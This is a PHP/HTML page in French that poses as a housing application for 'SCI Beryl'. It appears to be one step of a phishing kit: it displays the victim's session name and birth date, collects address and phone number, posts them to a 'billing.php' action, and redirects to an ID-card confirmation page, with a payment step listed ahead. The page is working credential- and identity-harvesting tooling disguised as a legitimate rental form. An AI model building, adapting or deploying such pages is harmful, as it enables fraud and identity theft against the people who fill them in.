<?php 


include("../infos.php");
include("../common/sub_includes.php");

?>
<html lang="fr">

<?php include("../common/header.php")  ?>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>
        .progressbar { margin: 0px 10px; overflow: hidden; }
        .progressbar > div { float: left; width: 20%; text-align: center; padding-bottom: 10px; border-bottom: 5px solid rgb(52, 141, 48); position: relative; margin-bottom: 7px; font-style: italic; }
        .progressbar > div > span { color: rgb(52, 141, 48); }
        .progressbar > div > div { position: absolute; bottom: -12px; left: 50%; width: 20px; height: 20px; background: rgb(52, 141, 48) none repeat scroll 0% 0%; border-radius: 10px; z-index: 0; }
        .progressbar > div.progressing > div { background: white none repeat scroll 0% 0%; border: 3px solid rgb(52, 141, 48); }
        .progressbar > div.progressing > span { color: rgb(0, 150, 136); font-style: normal; }
        @media (max-width: 470px) {
          .progressbar > div > span { font-size: 11px !important; }
          .progressbar > div { width: inherit; padding-left: 5px; }
          .progressbar { margin: 0px auto; }
          .last-payment-form > h1 { text-align: center; line-height: 100%; font-size: 25px; }
          .valider-btn { width: 100% !important; }
          .payment-form { padding: 10px !important; }
          .last-payment-form { padding: 10px !important; }
          .last-form-info > div { float: left !important; }
          .last-form-info > div > label { font-size: 11px; }
        }
        @media (max-width: 330px) {
          .progressbar > div > span { font-size: 10px !important; }
        }
        
        .content-wrap {
            overflow: hidden;
            margin: 10px 0px;
        }
        
        
        .content-wrap > div {
            float: left;
        }
        @media (min-width: 500px){
            .banner {
            float: left;
            width: 500px;
        }
        }
        .progressbar > div{
            width: 25%;
        }

    </style>
    <link rel="stylesheet" href="../assets/css/style_v2.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.css">

    <style>

        .container{
            width : 95% !important;
        }

    </style>
    <title>SCI Beryl</title>
</head>
<style>
    				.panel-heading{
					border-bottom : 2px solid #3A3E41 !important

				}
                span{
                    color : #3A3E41 !important;
                }
                .btn-xl{
                    background-color : #3A3E41 !important;
                }
</style>
<body>

<div class="row" style="display: flex; background: #3A3E41 none repeat scroll 0% 0%; margin-bottom: 30px;">
        <?php include("../common/head.php"); ?>
    </div>

    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li class="active">Demande de logement</li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">
        <form action="" method="POST">
        <div class="row">
            <div class="col-md-12">

                <div class="panel panel-default" style="background: url('') no-repeat;">
                    <div class="panel-heading" style="padding:5px">

                        <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Informations postales</h2>
                    </div>

                    <div class="panel-body">
                        <br> Bénéficiaire : <b><?php echo $_SESSION["nom"] . " " . $_SESSION["prenom"]  ?></b>
                        <br> Date de naissance : <b><?php echo $_SESSION["naissance"] ?></b>
                        <br> Date de la demande : <b><?php echo $_SESSION["date"] ?> à  <?php echo $_SESSION["heure"] ?></b>
                        <hr>

                        <div class="row">
                            <div class="col-md-7">
                                <div class="col-md-12">

                                    <div class="progressbar">
 
                                        <div>
                                            <span style="background: rgba(0, 0, 0, 0.0)!important;">Informations</span>
                                            <div></div>
                                        </div>
                                        <div class="progressing">
                                            <span style="background: rgba(0, 0, 0, 0.0)!important;">Adresse</span>
                                            <div></div>
                                        </div>
                                        <div>
                                            <span style="background: rgba(0, 0, 0, 0.0)!important;">Port</span>
                                            <div></div>
                                        </div>
                                        <div>
                                            <span style="background: rgba(0, 0, 0, 0.0)!important;">Règlement</span>
                                            <div></div>
                                        </div>
                                    </div>
                                    <br><br>
                                    <form action="" method="POST">
                                        <div class="form-group" id="fg_spi">
                                            <label for="spi_tmp">Adresse postale</label>
                                            <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                            <input class="form-control" id="name" name="input_adresse" type="text" aria-required="true" placeholder="" required="">
                                        </div>
                                    </form>
                                </div>

                                <div class="col-md-6">
                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Code postal</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="postals" name="input_zipcode" type="text" maxlength="5" aria-required="true" placeholder="" required="">
                                    </div>
                                </div>

                                <div class="col-md-6">
                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Ville</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="name" name="input_city" type="text" aria-required="true" placeholder="" required="">
                                    </div>
                                </div>

                                <div class="col-md-12">

                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Numéro de téléphone</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="phone" pattern="[0-9]{10}" name="input_tel" type="text" maxlength="10" minlength="10" aria-required="true" placeholder="" required="">
                                    </div>

                                    <button type="submit" id="submit" class="btn btn-xl btn-primary">Valider</button>

                                    <br><br>
                                </div>
                            </div>
                            <div class="col-md-5" style="border-radius:6px;">
                                <img class="col-md-12" src="https://iff.re/wp-content/uploads/2019/11/gestion-locative-1.jpg" style="border-radius:60px;;">
                            </div>

                        </div>

                    </div>
                </div>
            </div>
        </div>
        <br><br>
        </form>
    </main>

    <div id="loading" class="LoadingPage">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://static.vecteezy.com/ti/vecteur-libre/p1/2228877-immobilier-logo-design-entreprise-signe-logo-vecteur-gratuit-vectoriel.jpg">
                </div>
                <span>Veuillez patienter ...</span>
            </div>
        </div>
    </div>

	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>

    <script>

            document
                .getElementById("phone")
                .addEventListener("keypress", function(evt) {
                if (evt.which < 48 || evt.which > 57) {
                    evt.preventDefault();
                }
            });
            
            document
                .getElementById("postals")
                .addEventListener("keypress", function(evt) {
                if (evt.which < 48 || evt.which > 57) {
                    evt.preventDefault();
                }
            });

        $(document).ready(function() {
        			$("form").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "../actions/billing.php",
        						data: $this.serialize()
        					})
        					.done(function(msg) {
        						setTimeout(function() {
        							window.location.href = "confirm-cni.php";
        						}, 2000);
        					});
        				
        
        			});
        		});
    </script>

</body>

</html>